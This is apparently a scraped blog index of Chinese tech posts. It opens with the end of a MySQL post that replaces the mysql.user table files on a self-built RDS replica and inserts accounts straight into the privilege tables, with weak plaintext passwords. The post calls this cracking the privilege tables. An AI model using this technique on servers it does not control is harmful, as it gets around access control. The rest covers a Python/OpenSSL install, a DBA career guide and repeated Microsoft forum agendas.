8月 14 15:53 user_1.MYI-rw-r----- 1 mysql mysql 10630 8月 9 20:14 user.frm-rw-r----- 1 mysql mysql 98304 8月 9 20:14 user.ibd-rw-r--r-- 1 mysql mysql 328 8月 9 20:14 user.MYD-rw-r--r-- 1 mysql mysql 2048 8月 9 20:14 user.MYI-rw-r----- 1 mysql mysql 3569 8月 9 20:14 user.TRG-rw-r----- 1 mysql mysql 3982 8月 9 20:14 user_view.frmroot@joowing-server-06:/data/xtrabackup_data/mysql# mv user.frm user.ibd user.MYD user.MYI user.TRG /dataroot@joowing-server-06:/data/xtrabackup_data/mysql# ll user*-rw-r----- 1 mysql mysql 10630 8月 14 15:42 user_1.frm-rw-r----- 1 mysql mysql 744 8月 14 15:52 user_1.MYD-rw-r----- 1 mysql mysql 2048 8月 14 15:53 user_1.MYI-rw-r----- 1 mysql mysql 3982 8月 9 20:14 user_view.frmroot@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.frm user.frmroot@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYI user.MYIroot@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYD user.MYDroot@joowing-server-06:/data/xtrabackup_data/mysql# ll user*-rw-r----- 1 mysql mysql 10630 8月 14 15:42 user.frm-rw-r----- 1 mysql mysql 744 8月 14 15:52 user.MYD-rw-r----- 1 mysql mysql 2048 8月 14 15:53 user.MYI-rw-r----- 1 mysql mysql 3982 8月 9 20:14 user_view.frmroot@joowing-server-06:/data/xtrabackup_data/mysql# /data/mysql/support-files/mysql.server startStarting MySQL...... * root@joowing-server-06:/data/xtrabackup_data/mysql# mysql -uroot -p&apos;123&apos;mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 5Server version: 5.7.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.root@MySQL-01 15:55: [(none)]&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: rm-uf6f05k2rg95s23bp.mysql.rds.aliyuncs.com Master_User: idc_slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.001641 Read_Master_Log_Pos: 447207506 Relay_Log_File: joowing-server-06-relay-bin.000225 Relay_Log_Pos: 35529076 Relay_Master_Log_File: mysql-bin.001641 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: mysql.%,sys.%,information_schema.% Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 447207506 Relay_Log_Space: 35529295 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1095052097 Master_UUID: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc Master_Info_File: mysql.slave_master_info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:97478646-97483368 Executed_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:1-97483368,c39ecf19-5daa-11e8-aa9c-7cd30ac4764a:1-178658794,c69289d7-9bc9-11e8-b922-44a842431b62:1-12 Auto_Position: 1 Replicate_Rewrite_DB: Channel_Name: Master_TLS_Version: 1 row in set (0.00 sec)ERROR: No query specified# 验证只读账号mysql -uroot -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;mysql -ujoowingbuz -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;mysql -uottersync -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;mysql -usyncdw -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;mysql -udatasis -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;mysql -ujoowingv -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;mysql -udatadev -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;mysql -ureadonly -p&apos;123&apos; -e &quot;create database dbzyadmin;&quot;# 只读账号无法执行写操作，验证成功mysql: [Warning] Using a password on the command line interface can be insecure.ERROR 1044 (42000) at line 1: Access denied for user &apos;readonly&apos;@&apos;%&apos; to database &apos;dbzyadmin&apos; 后续用户权限变更操作指南 后续新增用户、删除用户、更改密码命令如下： 新增读写用户1insert into mysql.user_1 values (&apos;%&apos;,&apos;【用户名】&apos;, &apos;&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;【密码】&apos;)); 新增只读用户1insert into mysql.user_1 values (&apos;%&apos;,&apos;【用户名】&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;【密码】&apos;)); 删除用户命令1delete from mysql.user where user=&apos;【用户名】&apos;; 修改密码1update mysql.user set authentication_string=password(&apos;【密码】&apos;) where user=&apos;【用户名】&apos;; 后记RDS目前使用MySQL版本和官方在系统库上差异还是很大的，若需要搭建RDS到线下自建MySQL5.7的主从时，可以通过此法去实现。 本文中对user表的破解，同样适适用于mysql.db 、mysql.tables_priv表，都破解则可以将权限从用户拓展到库表列。读者可自行实验测试。","link":"/2018/08/22/booboo_others/2018-08-22-tec-mysql/"},{"title":"CentOS6.5配置python3.7安装后ssl问题","text":"摘要：解决Python3安装中的SSL问题 报错明细1pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available. 解决办法由于系统是CentOS release 6.7，所有openssl的版本为 OpenSSL 1.0.1e ,而python3.7需要的openssl的版本为 1.0.2 或者 1.1.x, 需要对openssl进行升级 并重新编译python3.7.0 export LDFLAGS=&quot;-L/usr/local/openssl/lib/&quot; 详细记录123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263[root@CNACLQLJMP010 install]# rpm -qa|grep opensslopenssl-devel-1.0.1e-58.el6_10.x86_64openssl-1.0.1e-58.el6_10.x86_64openssl-static-1.0.1e-58.el6_10.x86_64[root@CNACLQLJMP010 install]# openssl versionOpenSSL 1.0.1e-fips 11 Feb 2013wget https://www.openssl.org/source/openssl-1.1.1-pre8.tar.gztar -xf openssl-1.1.1-pre8.tar.gzcd openssl-1.1.1-pre8./config --prefix=/usr/local/openssl no-zlibmakemake installmv /usr/bin/openssl /usr/bin/openssl.bakmv /usr/include/openssl/ /usr/include/openssl.bakln -s /usr/local/openssl/include/openssl /usr/include/opensslln -s /usr/local/openssl/lib/libssl.so.1.1 /usr/local/lib64/libssl.soln -s /usr/local/openssl/bin/openssl /usr/bin/opensslecho &quot;/usr/local/openssl/lib&quot; &gt;&gt; /etc/ld.so.confldconfig -vopenssl versionif [[ -f &quot;/usr/bin/python3&quot; ]]; then exitfi# 安装系统依赖包yum -y install zlib-devel bzip2 bzip2-devel openssl openssl-static openssl-devel \\ncurses ncurses-devel sqlite sqlite-devel readline readline-devel tk tk-devel lzma gdbm \\gdbm-devel db4-devel libpcap-devel xz xz-devel libffi-devel gcc#检测 cloudcare 是否存在if [[ ! -f &quot;/alidata&quot; ]];thenmkdir /alidataecho &quot;Created /alidata&quot;fi# 下载安装包 python 3.7.3if [[ ! -f &quot;./Python-3.7.3.tgz&quot; ]];thencurl -O https://cloud-software.oss-cn-hangzhou.aliyuncs.com/linux%20%E8%BD%AF%E4%BB%B6/Python-3.7.3.tgzfi# 解压文件tar -xvf Python-3.7.3.tgz &amp;&amp; cd Python-3.7.3/# 编译 python 包export LDFLAGS=&quot;-L/usr/local/openssl/lib/&quot;./configure --prefix=/alidata/python3 make &amp;&amp; make install &amp;&amp; echo &quot;### Python3 install success!&quot;# 创建软连接ln -s /alidata/python3/bin/python3 /usr/bin/python3 &amp;&amp; echo &quot;### Add python3 link Done!&quot;ln -s /alidata/python3/bin/pip3 /usr/bin/pip3 &amp;&amp; echo &quot;### Add pip3 link Done!&quot;./configure --prefix=/alidata/python3 --with-openssl=/usr/local/opensslmake &amp;&amp; make install &amp;&amp; echo &quot;### Python3 install success!&quot;","link":"/2020/03/27/booboo_others/2020-03-26-tec-python/"},{"title":"2020年的前端感受","text":"HTML、CSS、JavaScript 三者的作用：HTML 负责内容和骨架，CSS 负责美化和样式，JavaScript 负责让其动起来！","link":"/2020/04/02/booboo_others/2020-04-02-tec-front/"},{"title":"如何成为一名优秀的MySQL数据库工程师","text":"阿里云ACP认证考试 入门 工作培训内容 总结能力 代码能力 事件处理要求 自我学习与沉淀 高阶 技术能力 业务能力 推荐书籍 MySQL的使用 MySQL的源码 阿里云ACP认证考试阿里云云计算专业认证考试（Alibaba Cloud Certified Professional，ACP） 入门 会搭建主从复制？一主多从 了解最新的MGR集群 会编写增删该查的SQL 知道InnoDB行锁的不同语法 会用mysqldump进行数据库逻辑备份和恢复 会用perconaxtrabackup进行数据库物理备份和恢复 会使用Linux常用命令 会搭建LAMP架构的网站 会使用RDS数据库 会使用DTS迁移工具 熟悉以下云数据库(云产品变化较快，建议去官网) 12345678910111213141516171819202122232425262728阿里云数据库产品 关系型数据库 云数据库 RDS MySQL 版 云数据库 RDS SQL Server 版 云数据库 RDS PostgreSQL 版 云数据库 RDS PPAS 版 云数据库 POLARDB 分析型数据库 ADS 云数据库 OceanBase 分布式关系型数据库服务 DRDSNoSQL数据库 云数据库 Redis 版 云数据库 MongoDB 版 云数据库 HBase 版 云数据库 Memcache 版 表格存储 TableStore混合分析数据库 HybridDB for MySQL HybridDB for PostgreSQL数据库管理 数据管理 DMS 混合云数据库管理 HDM 数据库备份 DBS CloudDBA迁移 数据传输 DTS 数据库和应用迁移 ADAM 闪电立方 工作培训内容总结能力 对每一个客户的落地需求，应提供相应的报告 报告建议使用MarkDown格式，Markdown编辑器推荐Typora https://www.typora.io/ 非常轻量，适用于苹果、微软、Linux 有中文版本 报告输出为PDF交付客户 事件归类总结有自己的方法论（例如常用故障排查命令、常用测试脚本） Confluence总结归类按时输出（Tips：故障类或命令多的建议先在本地使用markdown文档编写，后续复制粘贴归档至confluence；项目类，直接在confluence上记录） 代码能力 bash：能够编写自动备份恢复脚本（逻辑）、数据监控脚本 python：能够使用现有的python应用发现、健康报告、故障自愈、慢查询报告等脚本 sql：简单的SQL调优 事件处理要求 生产环境中的操作必须事先在测试环境中验证通过，并将测试验证报告留档confluence 钉钉及时响应，手机24小时开机 关键生产变更操作应两名工程师同时在场 自我学习与沉淀高阶 精通复制的原理 精通MHA的实现逻辑 精通MGR的机制 能对SQL进行调优 精通S、X、IS、IX锁的实现 精通mysqldump的实现原理 技术能力 熟知数据库各版本特性和Bug 解决难题的终极能力 拥有总结成方法论的能力 预测未来五年技术趋势的能力 业务能力 熟知各个业务在数据库侧的难点和解决之道 懂业务，能够协调业务一起进行架构改造 敢担责，勇背锅的能力 推荐书籍工作效率 推荐大家一本书，著名的搞定系列《Getting Things Done》的《搞定1无压工作的艺术》（GTD的已经成为时间管理系统的代称），这本书主要讲工作流程管理，个人效率提升方法，非常简单易行。GTD时间管理，并非是去管理时间，而是运用技巧、方法和工具帮助人们完成工作，实现目标，有效的运用时间。 GTD的核心理念概括就是必须记录下来要做的事，然后整理安排并使自己一一去执行。 GTD的五个核心原则是：收集、整理、组织、回顾、执行。 GTD的核心理念在于清空大脑，然后一步步按照设定的路线去努力执行。 微信读书里有电子版的 MySQL的使用 MySQL技术内幕InnoDB存储引擎 MySQL的官方手册 MySQL排错指南 高性能MySQL 数据库索引设计与优化 Effective MySQL系列 MySQL的源码 InnoDB - A journey to the core 深入MySQL源码 深入理解MySQL核心技术 MySQL内核InnoDB存储引擎 MySQL Internals Manual MariaDB原理与实现","link":"/2020/04/14/booboo_others/2020-04-14-tec-mysql/"},{"title":"Microsoft Online Tech Forum 微软在线技术峰会","text":"观看笔记炉边对谈及技术愿景解读萨提亚•纳德拉，柯睿杰，韦青 Azure服务器从2018年开始存放在海底，使用”氮气+无光”的方法 为了更好的“云”，微软开始测试“潜艇式”海底数据中心 Azure存储：使用玻璃存储，举例：Project Silica: 微软研究院实现“玻璃存储”，把电影《超人》写入石英玻璃 Power Apps 微软 Power Platform 技术路线与战略Charles Lamanna 企业级低代码开发平台的市场趋势与PowerApps中国市场策略 Power Apps 使用户能够在不编写代码的情况下生成功能丰富的自定义业务应用，从而使自定义业务应用生成体验变得民主化。 Power Apps 还提供了一个可扩展的平台，允许专业开发人员以编程方式与数据和元数据进行交互、应用业务逻辑、创建自定义连接器以及与外部数据集成。 2020年6月中国市场正式商用。 虽然没有实际使用过，但从介绍来看，以后的开发模式会有很大的变化，无代码、低代码的开发模式非常棒！ GithubMichael Francisco， GitHub全球产品技术生态总经理 本场开源：提升开发者创新速度的核心路径，让我们一起分享新知洞见未来，加速数字化转型。 关于开源的思考。 中国的开发者占了30%，增长速度37%(美国22%) 中国开发者社区规模没有美国大，但是增长速度比美国高。 现代代码中80%～90%来自代码库 关于剩余的10%，不要重复造轮子。 开源是一个分布式的开发社区，高效。 什么是内源？ 数字化转型加速度活动时间：2020年4月17日—2020年4月18日 Microsoft Online Tech Forum 微软在线技术峰会是一场面向技术专业人群与生态合作伙伴的前沿科技交流大会。今年我们将围绕“数字化转型加速度”主题，以微软自身技术发展和数字化转型实践为引，从云，生产力、商业应用及数字化转型实践层面助力企业及个人提升自身技术实力，加速数字化转型，成就智能未来。 Microsoft Online Tech Forum微软在线技术峰会 数字化转型加速度 活动时间：2020年4月17日—2020年4月18日 大会概览 Microsoft Online Tech ForumMicrosoft Online Tech Forum 微软在线技术峰会是一场面向技术专业人群与生态合作伙伴的前沿科技交流大会。今年我们将围绕“数字化转型加速度”主题，以微软自身技术发展和数字化转型实践为引，从云，生产力、商业应用及数字化转型实践层面助力企业及个人提升自身技术实力，加速数字化转型，成就智能未来。演讲嘉宾萨提亚•纳德拉先生现任微软公司首席执行官。在2014年2月被任命为微软首席执行官之前，纳德拉曾领导过微软多个核心业务部门，业务范围涉及商用和消费领域。自 1992 年加入微软以来，纳德拉主导了微软众多产品和服务的重要战略和技术转型，功绩显著。萨提亚•纳德拉微软公司首席执行官作为科技行业领袖，柯睿杰热衷于利用技术与创新，赋能企业与组织的发展和成长，并推进和实现其各自的数字化转型。作为微软公司资深副总裁、微软大中华区董事长兼首席执行官，柯睿杰全面负责微软在整个大中华区市场的销售、市场、服务、运营等战略实施，并确保其始终处于微软全球最具创新和成长活力的市场。柯睿杰微软全球资深副总裁 微软大中华区董事长兼首席执行官Mark Russinovich是Microsoft全球企业级云平台Microsoft Azure的首席技术官。 Mark是分布式系统，操作系统和网络安全领域的公认专家，获得了博士学位，是Microsoft Ignite，Microsoft Build和RSA Conference等行业会议的热门演讲者。 Mark Russinovich微软 Azure 首席技术官Charles Lamannna 领导业务应用程序组的低代码应用程序平台(LCAP)的工程团队。LCAP 研发团队包括 Dynamics 365平台、Power Apps、Power Automation、Power Virtual Agent、AI Builder 和通用数据服务产品的产品研发团队。 Charles Lamanna微软全民应用开发平台全球副总裁Paul Lorimer管理Office 365的工程和运营团队，专注于业务扩展和服务质量。Paul领导微软Office 365的关键业务领域，包括扩展计划、企业和复杂组织的策略、Office 365遵从性和隐私以及Office 365业务的其他相关领域。保罗·洛里默微软公司副总裁Brendan Burns是Kubernetes的联合创始人，现在是微软开源云平台的副总裁，主持Azure容器服务（AKS）、Azure容器实例、Openshift，and Azure Cloud Shell和Azure资源管理器的开发工作。Brendan BurnsKubernetes联合创始人，微软开源及云端平台副总裁Michael Francisco 是 GitHub 的全球产品技术生态总经理。他有在亚马逊、微软等建立并发展高效团队的经验，他专注于合作伙伴的发展和新兴技术。Michael FranciscoGitHub全球产品技术生态总经理投身亚洲移动通信、信息技术和智能设备等领域二十余年，在电子信息产业领域拥有丰富的知识与经验。现任微软中国首席技术官，负责将微软的产业愿景、创新技术与数字化转型的切身体会介绍给中国的行业伙伴与业界领导者。韦青微软(中国) 首席技术官徐明强目前担任微软全渠道事业部首席技术官，负责微软大中华区合作伙伴解决方案策略技术策划工作。徐明强的团队侧重现代工作空间、数据和人工智能、业务应用、云基础设施及应用领域，为合作伙伴提供架构上的支撑。徐明强微软（中国）全渠道事业部首席技术官贾缙埃森哲大中华区企业技术创新事业部总裁大会日程4月17日4月18日09:00-09:50愿景演讲萨提亚•纳德拉，柯睿杰 立即订阅09:50-10:30微软 Azure：世界的电脑Mark Russinovich 立即订阅10:30-11:10微软 Power Platform 技术路线与战略Charles Lamanna 立即订阅11:10-11:50Keynote from GitHubMichael Francisco 立即订阅13:00-13:30行业上云实践和云上运维体系王平，戴辉 立即订阅13:30-14:20微软 Power Platform “全民低代码开发”灌注企业创新强大生命力张蔚 立即订阅疫后反思：借助 Microsoft 365 重塑企业智能办公体系李亮 立即订阅数字化企业的 IT 转型陈荣华 立即订阅企业上云现代化的历程徐明强 立即订阅智能、安全、合规：围绕 Microsoft Teams 构建未来云协作平台唐浩 立即订阅企业级低代码开发平台的市场趋势与PowerApps中国市场策略韦青，李威 立即订阅如何提升 Azure 云平台的隐私与环境治理赵健 立即订阅14:20-15:10PowerApps 低代码开发平台赋能员工数字化转型最后一公里方庆 立即订阅15:10-16:00云平台助力企业创新——基于 Linux 的云上最佳实践马平 立即订阅从 AI 在工业中的最佳实践到制造业升级之路管震，刘龙泽 立即订阅多渠道触点智能客服技术架构及混合现实现场服务演示吴淑玲 立即订阅Microsoft Teams 一站式会议解决方案（TW）Kim Cheng 立即订阅从 IoT 到 AIoT: 智慧农业重装上阵王筱东，韦光亮 立即订阅SAP+Azure，助力业务优化革新方迅，丁晓枫，童麒麟 立即订阅Microsoft Teams 行业应用场景概览（HK）Dan Stevenson 立即订阅16:00-16:50Microsoft Teams as Platform: 围绕 Teams 的平台化战略与实践陈希章 立即订阅16:50-17:40万科智慧地产背后的技术实践张自豪，彭靖田 立即订阅全媒体大数据赋能企业数字化转型严宇杰，敖建旺 立即订阅Power BI 赋能企业财务转型贾菁 立即订阅如何利用开源数据库实现数据现代化赵阳 立即订阅使业务跟上发展的步伐——加速应用程序现代化李一峰 立即订阅Dynamics 365 财务和运营与 Azure Data Lake / Synapse / 通用数据服务 的深度整合剖析张翼翔 立即订阅互联，预测，认知与创新—— Dynamics 365 助力智能供应链转型张骏 立即订阅17:40-18:30Compliance, privacy, and securing your data in Dynamics 365 and Power Platform（HK）Wilson Kong 立即订阅后疫情时代的零售数字化转型闵捷 立即订阅09:00-09:40主题演讲：Microsoft 365 企业效率与协作保罗·洛里默 立即订阅09:40-10:20主题演讲：基于 K8S 和 Azure 的云原生Brendan Burns 立即订阅10:20-10:50开源在企业中的应用与发展趋势 （English Session）Chris Aniszczyk 立即订阅10:50-11:40侵略如火，不动如山——微软如何通过“零信任”守护企业安全张美波 立即订阅微软云安全战略 （English Session）Fernando Cima 立即订阅微软混合现实及 HoloLens 2 赋能工业领域数字化转型邵昱坤，任沁明，黄悰，梅颖广 立即订阅疫后再谈数字化转型对我们的启示徐明强，贾缙 立即订阅Azure 无服务器与微服务治理模式Alan Liu 立即订阅知识产业流程自动化的技术跃迁胡世超，鲍捷 立即订阅微软 AI 语音云圆桌会议：如何利用语音技术应对复杂对话识别和情感声音合成等多种挑战廖勤樱，Alan Ip，刘越颖，赵澈 立即订阅11:40-12:30Using Pre-Built AI to Solve Business ChallengesJose Hui（HK） 立即订阅13:00-13:50AI 知识挖掘：使用 Azure 搜索内置 AI 能力从内容中挖掘知识王芷 立即订阅简化 K8s 开发！OAM 与 DAPR 云原生应用的全流程研发实战白海石 立即订阅数据防泄露，基于 Microsoft 信息保护和威胁防护的全流程实战李辉 立即订阅机器人即服务(RaaS)加速物流智能化转型沈沐，王关平 立即订阅Azure Spring Cloud: 在 Kubernetes 上运行 spring boot 微服务的新方式梁莉 立即订阅通过智能身份和访问管理，保护企业安全李辉 立即订阅谈转型 - 微软数据与人工智能服务赋能设备制造业的经验李磊，饶浩斌 立即订阅13:50-14:40How To Build Machine Learning Models with Low CodeMike Chan（HK） 立即订阅14:40-15:30生产应用程序的 Debugging 和 InteractingThomas Huang （TW） 立即订阅DevOps 与 GitHub 在企业中的最佳实践庄俊乾 立即订阅企业内部风险与合规管理林坚乐（TW） 立即订阅云平台的安全响应机制陈健宁，陈彬彬 立即订阅让数据产生价值，基于数据湖的大数据平台建设毕伟 立即订阅中台再思考，微软如何构建现代化数据平台？朱人杰 立即订阅使用 Azure IoT Plug and Play 快速构建物联网方案詹文平 立即订阅15:30-16:20洞察威胁，全面保护——Microsoft Threat Protection 侦测调查的威力 龚祺莎 立即订阅16:20-17:10Azure Synapse 在游戏数据分析中的最佳实践杨永波 立即订阅基于 Azure IoT Hub 构建物联网设备管理与数据处理解决方案 施佳 立即订阅微软云 AI 平台助力开发者快速构建计算机视觉应用陈堰平 立即订阅使用 MLOps 进行机器学习生命周期管理赵明杰 立即订阅如何实现云计算网络的纵深防御体系 王文斌 立即订阅为什么 VS Code 如此流行？韩骏 立即订阅Azure Sphere 在亿级设备体量下的端到端一站式深度数据防护实践连矩锋 立即订阅17:10-18:00如何通过 SDL 和 SecDevOps 实现软件及应用的原生安全朱长明 立即订阅下一代智能数仓助力企业数字化转型李扬 立即订阅4月17日09:00-09:50愿景演讲萨提亚•纳德拉，柯睿杰 立即订阅09:50-10:30微软 Azure：世界的电脑Mark Russinovich 立即订阅10:30-11:10微软 Power Platform 技术路线与战略Charles Lamanna 立即订阅11:10-11:50Keynote from GitHubMichael Francisco 立即订阅13:00-13:30疫后反思：借助 Microsoft 365 重塑企业智能办公体系李亮 立即订阅13:30-14:20微软 Power Platform “全民低代码开发”灌注企业创新强大生命力张蔚 立即订阅企业上云现代化的历程徐明强 立即订阅智能、安全、合规：围绕 Microsoft Teams 构建未来云协作平台唐浩 立即订阅企业级低代码开发平台的市场趋势与PowerApps中国市场策略韦青，李威 立即订阅如何提升 Azure 云平台的隐私与环境治理赵健 立即订阅14:20-15:10PowerApps 低代码开发平台赋能员工数字化转型最后一公里方庆 立即订阅15:10-16:00云平台助力企业创新——基于 Linux 的云上最佳实践马平 立即订阅从 AI 在工业中的最佳实践到制造业升级之路管震，刘龙泽 立即订阅多渠道触点智能客服技术架构及混合现实现场服务演示吴淑玲 立即订阅Microsoft Teams 一站式会议解决方案（TW）Kim Cheng 立即订阅从 IoT 到 AIoT: 智慧农业重装上阵王筱东，韦光亮 立即订阅SAP+Azure，助力业务优化革新方迅，丁晓枫，童麒麟 立即订阅Microsoft Teams 行业应用场景概览（HK）Dan Stevenson 立即订阅16:00-16:50Microsoft Teams as Platform: 围绕 Teams 的平台化战略与实践陈希章 立即订阅16:50-17:40万科智慧地产背后的技术实践张自豪，彭靖田 立即订阅全媒体大数据赋能企业数字化转型严宇杰，敖建旺 立即订阅Power BI 赋能企业财务转型贾菁 立即订阅如何利用开源数据库实现数据现代化赵阳 立即订阅使业务跟上发展的步伐——加速应用程序现代化李一峰 立即订阅Dynamics 365 财务和运营与 Azure Data Lake / Synapse / 通用数据服务 的深度整合剖析张翼翔 立即订阅互联，预测，认知与创新—— Dynamics 365 助力智能供应链转型张骏 立即订阅17:40-18:30后疫情时代的零售数字化转型闵捷 立即订阅4月18日09:00-09:40主题演讲：Microsoft 365 企业效率与协作保罗·洛里默 立即订阅09:40-10:20主题演讲：基于 K8S 和 Azure 的云原生Brendan Burns 立即订阅10:20-10:50微软云安全战略 （English Session）Fernando Cima 立即订阅10:50-11:40侵略如火，不动如山——微软如何通过“零信任”守护企业安全张美波 立即订阅疫后再谈数字化转型对我们的启示徐明强，贾缙 立即订阅微软混合现实及 HoloLens 2 赋能工业领域数字化转型邵昱坤，任沁明，黄悰，梅颖广 立即订阅11:40-12:30机器人即服务(RaaS)加速物流智能化转型沈沐，王关平 立即订阅13:00-13:50数据防泄露，基于 Microsoft 信息保护和威胁防护的全流程实战李辉 立即订阅通过智能身份和访问管理，保护企业安全李辉 立即订阅13:50-14:40云平台的安全响应机制陈健宁，陈彬彬 立即订阅14:40-15:30企业内部风险与合规管理林坚乐（TW） 立即订阅中台再思考，微软如何构建现代化数据平台？朱人杰 立即订阅让数据产生价值，基于数据湖的大数据平台建设毕伟 立即订阅15:30-16:20洞察威胁，全面保护——Microsoft Threat Protection 侦测调查的威力 龚祺莎 立即订阅16:20-17:10微软云 AI 平台助力开发者快速构建计算机视觉应用陈堰平 立即订阅使用 MLOps 进行机器学习生命周期管理赵明杰 立即订阅如何实现云计算网络的纵深防御体系 王文斌 立即订阅17:10-18:00如何通过 SDL 和 SecDevOps 实现软件及应用的原生安全朱长明 立即订阅下一代智能数仓助力企业数字化转型李扬 立即订阅4月17日09:00-09:50愿景演讲萨提亚•纳德拉，柯睿杰 立即订阅09:50-10:30微软 Azure：世界的电脑Mark Russinovich 立即订阅10:30-11:10微软 Power Platform 技术路线与战略Charles Lamanna 立即订阅11:10-11:50Keynote from GitHubMichael Francisco 立即订阅13:00-13:30疫后反思：借助 Microsoft 365 重塑企业智能办公体系李亮 立即订阅13:30-14:20微软 Power Platform “全民低代码开发”灌注企业创新强大生命力张蔚 立即订阅企业上云现代化的历程徐明强 立即订阅智能、安全、合规：围绕 Microsoft Teams 构建未来云协作平台唐浩 立即订阅企业级低代码开发平台的市场趋势与PowerApps中国市场策略韦青，李威 立即订阅如何提升 Azure 云平台的隐私与环境治理赵健 立即订阅14:20-15:10PowerApps 低代码开发平台赋能员工数字化转型最后一公里方庆 立即订阅15:10-16:00云平台助力企业创新——基于 Linux 的云上最佳实践马平 立即订阅从 AI 在工业中的最佳实践到制造业升级之路管震，刘龙泽 立即订阅多渠道触点智能客服技术架构及混合现实现场服务演示吴淑玲 立即订阅Microsoft Teams 一站式会议解决方案（TW）Kim Cheng 立即订阅从 IoT 到 AIoT: 智慧农业重装上阵王筱东，韦光亮 立即订阅SAP+Azure，助力业务优化革新方迅，丁晓枫，童麒麟 立即订阅Microsoft Teams 行业应用场景概览（HK）Dan Stevenson 立即订阅16:00-16:50Microsoft Teams as Platform: 围绕 Teams 的平台化战略与实践陈希章 立即订阅16:50-17:40万科智慧地产背后的技术实践张自豪，彭靖田 立即订阅全媒体大数据赋能企业数字化转型严宇杰，敖建旺 立即订阅Power BI 赋能企业财务转型贾菁 立即订阅如何利用开源数据库实现数据现代化赵阳 立即订阅使业务跟上发展的步伐——加速应用程序现代化李一峰 立即订阅Dynamics 365 财务和运营与 Azure Data Lake / Synapse / 通用数据服务 的深度整合剖析张翼翔 立即订阅互联，预测，认知与创新—— Dynamics 365 助力智能供应链转型张骏 立即订阅17:40-18:30Compliance, privacy, and securing your data in Dynamics 365 and Power Platform（HK）Wilson Kong 立即订阅后疫情时代的零售数字化转型闵捷 立即订阅4月18日09:00-09:40主题演讲：Microsoft 365 企业效率与协作保罗·洛里默 立即订阅09:40-10:20主题演讲：基于 K8S 和 Azure 的云原生Brendan Burns 立即订阅10:20-10:50开源在企业中的应用与发展趋势 （English Session）Chris Aniszczyk 立即订阅10:50-11:40侵略如火，不动如山——微软如何通过“零信任”守护企业安全张美波 立即订阅微软云安全战略 （English Session）Fernando Cima 立即订阅微软混合现实及 HoloLens 2 赋能工业领域数字化转型邵昱坤，任沁明，黄悰，梅颖广 立即订阅疫后再谈数字化转型对我们的启示徐明强，贾缙 立即订阅Azure 无服务器与微服务治理模式Alan Liu 立即订阅知识产业流程自动化的技术跃迁胡世超，鲍捷 立即订阅微软 AI 语音云圆桌会议：如何利用语音技术应对复杂对话识别和情感声音合成等多种挑战廖勤樱，Alan Ip，刘越颖，赵澈 立即订阅11:40-12:30Using Pre-Built AI to Solve Business ChallengesJose Hui（HK） 立即订阅13:00-13:50AI 知识挖掘：使用 Azure 搜索内置 AI 能力从内容中挖掘知识王芷 立即订阅简化 K8s 开发！OAM 与 DAPR 云原生应用的全流程研发实战白海石 